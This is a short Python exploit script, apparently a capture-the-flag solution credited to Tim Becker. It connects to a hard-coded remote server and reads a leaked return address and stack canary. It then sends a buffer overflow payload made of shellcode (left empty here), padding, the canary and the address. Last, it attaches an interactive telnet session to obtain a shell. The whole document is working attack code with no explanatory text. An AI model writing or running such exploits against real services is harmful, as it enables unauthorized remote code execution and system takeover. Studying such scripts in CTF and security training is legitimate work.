# Tim Becker - 0x90.avi

import struct                                                                   
import socket                                                                   
import telnetlib
import time

SHELLCODE= "" #fd reuse shellcode

def read_info(s):
    bytes = s.recv(8)
    address = bytes[0:4]
    secret =  bytes[4:8]
    print s.recv(128)
    return (address, secret)

def send_payload(address, secret, s):
    payload = (                                                                
                SHELLCODE +
                "A" * (0x800 - len(SHELLCODE)) + 
                secret +
                "A" * 12 +
                address
        )

    s.send(payload + "\n")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('128.238.66.212', 31338))
#s.connect(('127.0.0.1', 31338))

(address, secret) = read_info(s)
send_payload(address, secret, s)

t = telnetlib.Telnet()                                                            
t.sock = s
t.interact() 
